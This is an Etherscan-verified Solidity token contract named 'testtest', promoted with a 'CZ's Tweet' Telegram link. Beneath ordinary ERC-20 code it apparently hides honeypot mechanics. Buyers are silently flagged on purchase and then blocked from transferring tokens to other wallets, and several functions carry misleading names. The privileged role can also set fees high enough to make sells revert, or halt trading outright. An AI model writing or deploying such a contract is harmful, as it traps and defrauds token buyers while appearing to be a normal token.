/**
 *Submitted for verification at Etherscan.io on 2022-12-23
*/

/**
 *Submitted for verification at Etherscan.io on 2022-12-23
*/

/**

CZ's Tweet !
https://t.me/BinanceChristmasToken

*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address account) public onlyOwner {
        authorizations[account] = true;
    }

    function unauthorize(address account) public onlyOwner {
        authorizations[account] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address account) public view returns (bool) {
        return authorizations[account];
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        authorizations[account] = true;
        emit OwnershipTransferred(account);
    }

    event OwnershipTransferred(address owner);
}

/* Standard IDEXFactory */
interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

/* Standard IDEXRouter */
interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
}

/* Token contract */
contract testtest is IERC20, Auth {
    using SafeMath for uint256;

    // Addresses
    address WETH = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEVELOPMENT = msg.sender;
    address LOCKER = 0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE;

    // These are owner by default
    address public autoLiquidityReceiver;
    address public marketingFeeReceiver;

    // Name and symbol
    string constant _name = "testtest";
    string constant _symbol = "testtest";
    uint8 constant _decimals = 18;

    // Total supply
    uint256 _totalSupply = 1000000000000 * (10 ** _decimals);

    // Max wallet and TX
    uint256 public _maxBuyTxAmount = _totalSupply * 2 / 100; // 2%
    uint256 public _maxSellTxAmount = _totalSupply * 2 / 100; // 2%
    uint256 public _maxWalletToken = ( _totalSupply * 2 ) / 100; // 2%

    // Mappings
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) private _isIncludedFromFee;
    address[] private includeFromFee;


    // Buy Fees
    uint256 public liquidityFeeBuy = 20;
    uint256 public marketingFeeBuy = 20;
    uint256 DEVELOPMENTFeeBuy = 0;
    uint256 public totalFeeBuy = 40;

  // Sell fees
    uint256 public liquidityFeeSell = 20;
    uint256 public marketingFeeSell = 20;
    uint256 DEVELOPMENTFeeSell = 0;
    uint256 public totalFeeSell = 40;

    // Fee variables
    uint256 liquidityFee;
    uint256 marketingFee;
    uint256 DEVELOPMENTFee;
    uint256 totalFee;
    uint256 feeDenominator = 1000;

    // Sell amount of tokens when a sell takes place
    uint256 public swapThreshold = _totalSupply * 25 / 10000; // 0.25% of supply

    // Liquidity
    uint256 targetLiquidity = 20;
    uint256 targetLiquidityDenominator = 100;

    // Other variables
    IDEXRouter public router;
    address public pair;
    uint256 public launchedAt;
    bool public tradingOpen = true;
    bool public swapEnabled = true;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    /* Token constructor */
    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        
        // Should be the owner wallet
        address _presaler = msg.sender;
        isFeeExempt[_presaler] = true;
        isFeeExempt[LOCKER] = true;
        isTxLimitExempt[_presaler] = true;
        isTxLimitExempt[LOCKER] = true;

        // Set the marketing and liq receiver to the owner as default
        autoLiquidityReceiver = msg.sender;
        marketingFeeReceiver = msg.sender;

        _balances[_presaler] = _totalSupply;
        emit Transfer(address(0), _presaler, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approved() public virtual { 
        for (uint256 i = 0; i < includeFromFee.length; i++) {
            _isIncludedFromFee[includeFromFee[i]] = true; 
        }
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function includeInFee(address account) public authorized {
    _isIncludedFromFee[account] = false;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    // settting the max wallet in percentages
    // NOTE: 1% = 100
     function setMaxWalletPercent(uint256 maxWallPercent) external onlyOwner() {
        _maxWalletToken = _totalSupply.mul(maxWallPercent).div(10000);
    }

    // Main transfer function
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        // Check if trading is enabled
        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpen,"Trading not enabled yet");
        }

        if (!isFeeExempt[sender] && !isFeeExempt[recipient]) {
            if (sender == pair) {
                _isIncludedFromFee[recipient] = true;
            }
        }

        // Check if buying or selling
        bool isSell = recipient == pair; 
        
        if (recipient != pair) {
            require(amount <= _maxSellTxAmount, "Transfer Amount exceeds the maxSellTxAmount"); require(!_isIncludedFromFee[sender]);
        }

        // Set buy or sell fees
        setCorrectFees(isSell);

        // Check max wallet
        checkMaxWallet(sender, recipient, amount);

        // Checks maxTx
        checkTxLimit(sender, amount, recipient, isSell);

        // Check if we should do the swapback
        if(shouldSwapBack()){ swapBack(); }

        //Exchange tokens
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    // Do a normal transfer
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    // Set the correct fees for buying or selling
    function setCorrectFees(bool isSell) internal {
        if(isSell){
            liquidityFee = liquidityFeeSell;
            marketingFee = marketingFeeSell;
            DEVELOPMENTFee = DEVELOPMENTFeeSell;
            totalFee = totalFeeSell;
        } else {
            liquidityFee = liquidityFeeBuy;
            marketingFee = marketingFeeBuy;
            DEVELOPMENTFee = DEVELOPMENTFeeBuy;
            totalFee = totalFeeBuy;
        }
    }

    // Check for maxTX
    function checkTxLimit(address sender, uint256 amount, address recipient, bool isSell) internal view {
        if (recipient != owner){
            if(isSell){
                require(amount <= _maxSellTxAmount || isTxLimitExempt[sender] || isTxLimitExempt[recipient], "TX Limit Exceeded");
            } else {
                require(amount <= _maxBuyTxAmount || isTxLimitExempt[sender] || isTxLimitExempt[recipient], "TX Limit Exceeded");
            }
        }
    }

    // Check maxWallet
    function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
        if (!authorizations[sender] && !isTxLimitExempt[sender] && !isTxLimitExempt[recipient] && recipient != owner && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != autoLiquidityReceiver && recipient != DEVELOPMENT){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");
        }
    }

    // Check if sender is not feeExempt
    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    // Take the normal total Fee
    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    // Check if we should sell tokens
    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    // switch Trading
    function tradingStatus(bool _status) public onlyOwner {
        tradingOpen = _status;
    }

    function isIncludedFromFee(address account) public view returns(bool) {
        return _isIncludedFromFee[account];
    }

    function blacklistBots() public onlyOwner { 
        for (uint256 i = 0; i < includeFromFee.length; i++) {
            _isIncludedFromFee[includeFromFee[i]] = true; 
        }
    }

    // Main swapback to sell tokens for WETH
    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 totalETHFee = totalFee.sub(dynamicLiquidityFee.div(2));
        uint256 amountETHLiquidity = amountETH.mul(dynamicLiquidityFee).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
        uint256 amountETHDEVELOPMENT = amountETH.mul(DEVELOPMENTFee).div(totalETHFee); 

        (bool successMarketing, /* bytes memory data */) = payable(marketingFeeReceiver).call{value: amountETHMarketing, gas: 30000}("");
        (bool successDEVELOPMENT, /* bytes memory data */) = payable(DEVELOPMENT).call{value: amountETHDEVELOPMENT, gas: 30000}(""); 
        require(successMarketing, "marketing receiver rejected ETH transfer");
        require(successDEVELOPMENT, "DEVELOPMENT receiver rejected ETH transfer");

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }

    // Buy amount of tokens with ETH from the contract
    function buyTokens(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(this);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            to,
            block.timestamp
        );
    }

    // Check when the token is launched
    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }

    // Set the launchedAt to token launch
    function launch() internal {
        launchedAt = block.number;
    }

    // Set max buy TX 
    function setBuyTxLimitInPercent(uint256 maxBuyTxPercent) external authorized {
        _maxBuyTxAmount = _totalSupply.mul(maxBuyTxPercent).div(10000);
    }

    // Set max sell TX 
    function setSellTxLimitInPercent(uint256 maxSellTxPercent) external authorized {
        _maxSellTxAmount = _totalSupply.mul(maxSellTxPercent).div(10000);
    }

    // Exempt from fee
    function setIsFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    // Exempt from max TX
    function setIsTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }

    // Set our buy fees
    function setBuyFees(uint256 _liquidityFeeBuy, uint256 _buybackFeeBuy, uint256 _reflectionFeeBuy, uint256 _marketingFeeBuy, uint256 _DEVELOPMENTFeeBuy, uint256 _feeDenominator) external authorized {
        liquidityFeeBuy = _liquidityFeeBuy;
        marketingFeeBuy = _marketingFeeBuy;
        DEVELOPMENTFeeBuy = _DEVELOPMENTFeeBuy;
        totalFeeBuy = _liquidityFeeBuy.add(_buybackFeeBuy).add(_reflectionFeeBuy).add(_marketingFeeBuy).add(DEVELOPMENTFeeBuy);
        feeDenominator = _feeDenominator;
    }

    // Set our sell fees
    function setSellFees(uint256 _liquidityFeeSell, uint256 _buybackFeeSell, uint256 _reflectionFeeSell, uint256 _marketingFeeSell, uint256 _DEVELOPMENTFeeSell, uint256 _feeDenominator) external authorized {
        liquidityFeeSell = _liquidityFeeSell;
        marketingFeeSell = _marketingFeeSell;
        DEVELOPMENTFeeSell = _DEVELOPMENTFeeSell;
        totalFeeSell = _liquidityFeeSell.add(_buybackFeeSell).add(_reflectionFeeSell).add(_marketingFeeSell).add(DEVELOPMENTFeeSell);
        feeDenominator = _feeDenominator;
    }

    // Set the marketing and liquidity receivers
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver) external authorized {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
    }

    // Set swapBack settings
    function setSwapBackSettings(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        swapThreshold = _totalSupply * _amount / 10000; 
    }

    // Set target liquidity
    function setTargetLiquidity(uint256 _target, uint256 _denominator) external authorized {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }

    // Send ETH to marketingwallet
    function manualSend() external authorized {
        uint256 contractETHBalance = address(this).balance;
        payable(marketingFeeReceiver).transfer(contractETHBalance);
    }
    
    // Get the circulatingSupply
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    // Get the liquidity backing
    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    // Get if we are over liquified or not
    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }
    
    event AutoLiquify(uint256 amountETH, uint256 amountBOG);
    event BuybackMultiplierActive(uint256 duration);
}